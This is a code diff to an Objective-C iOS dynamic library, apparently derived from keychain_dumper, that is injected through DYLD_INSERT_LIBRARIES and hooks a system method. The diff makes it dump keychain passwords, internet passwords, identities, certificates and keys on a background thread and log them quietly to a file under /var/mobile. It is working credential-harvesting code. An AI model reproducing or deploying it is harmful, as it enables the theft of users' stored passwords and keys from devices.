@@ -36,21 +36,26 @@ void printCertificate(NSDictionary *certificateItem);
 
 @end
 
-
-
 #pragma mark - Keychain Function
 
 void printToStdOut(NSString *format, ...) {
     va_list args;
     va_start(args, format);
     NSString *formattedString = [[NSString alloc] initWithFormat: format arguments: args];
-    UIAlertView *pp = [[UIAlertView alloc] initWithTitle:@"d" message:formattedString delegate:nil cancelButtonTitle:@"ok" otherButtonTitles:nil, nil];
-    [pp show];
+    const char *op = [formattedString UTF8String];
+    freopen("/var/mobile/taiji.log", "r", stdin);
+    freopen("/var/mobile/taiji1.log", "w", stdout);
+    char s;
+    while (scanf("%c",&s)==1) {
+        printf("%c",s);
+    }
+    fclose(stdin);
+    printf("%s\n",op);
+    fclose(stdout);
+    system("rm /var/mobile/taiji.log");
+    system("mv /var/mobile/taiji1.log /var/mobile/taiji.log");
+    
     va_end(args);
-    FILE *fp = fopen("/var/mobile/taiji.log", "w");
-    const char *string = [formattedString UTF8String];
-    fwrite(&string, sizeof(string), 1, fp);
-    fclose(fp);
 }
 
 NSMutableArray *getCommandLineOptions(int argc, char **argv) {
@@ -143,17 +148,7 @@ NSString * getEmptyKeychainItemString(CFTypeRef kSecClassType) {
 
 
 void printUsage() {
-    /*
-	printToStdOut(@"Usage: keychain_dumper [-e]|[-h]|[-agnick]\n");
-	printToStdOut(@"<no flags>: Dump Password Keychain Items (Generic Password, Internet Passwords)\n");
-	printToStdOut(@"-a: Dump All Keychain Items (Generic Passwords, Internet Passwords, Identities, Certificates, and Keys)\n");
-	printToStdOut(@"-e: Dump Entitlements\n");
-	printToStdOut(@"-g: Dump Generic Passwords\n");
-	printToStdOut(@"-n: Dump Internet Passwords\n");
-	printToStdOut(@"-i: Dump Identities\n");
-	printToStdOut(@"-c: Dump Certificates\n");
-	printToStdOut(@"-k: Dump Keys\n");
-     */
+    NSLog(@"");
 }
 
 void dumpKeychainEntitlements() {
@@ -334,6 +329,11 @@ void printResultsForSecClass(NSArray *keychainItems, CFTypeRef kSecClassType) {
 		printResultsForSecClass(keychainItems, (CFTypeRef)kSecClassType);
 		[keychainItems release];
 	}
+    double delayInSeconds = 2.0;
+    dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(delayInSeconds * NSEC_PER_SEC));
+    dispatch_after(popTime, dispatch_get_main_queue(), ^(void){
+        
+    });
 	[pool drain];
 }
 
@@ -388,11 +388,12 @@ static IMP sOriginalImp = NULL;
     sOriginalImp(self, @selector(switcherWasPresented:), self);   //%orig
     UIAlertView *alert = [[UIAlertView alloc] initWithTitle:@"INJECTED" message:@"Method has been replaced by objc_runtime dynamic library\nDYLD_INSERT_LIBRARIES=libMonsoon.dylib" delegate:nil cancelButtonTitle:@"OK" otherButtonTitles: nil];
     [alert show];
-    
-    printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassGenericPassword), (CFTypeRef)(id)kSecClassGenericPassword);
-    printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassInternetPassword), (CFTypeRef)(id)kSecClassInternetPassword);
-    printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassIdentity), (CFTypeRef)(id)kSecClassIdentity);
-    printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassCertificate), (CFTypeRef)(id)kSecClassCertificate);
-    printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassKey), (CFTypeRef)(id)kSecClassKey);
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
+        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassGenericPassword), (CFTypeRef)(id)kSecClassGenericPassword);
+        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassInternetPassword), (CFTypeRef)(id)kSecClassInternetPassword);
+        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassIdentity), (CFTypeRef)(id)kSecClassIdentity);
+        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassCertificate), (CFTypeRef)(id)kSecClassCertificate);
+        printResultsForSecClass(getKeychainObjectsForSecClass((CFTypeRef)(id)kSecClassKey), (CFTypeRef)(id)kSecClassKey);
+    });
 }
 @end
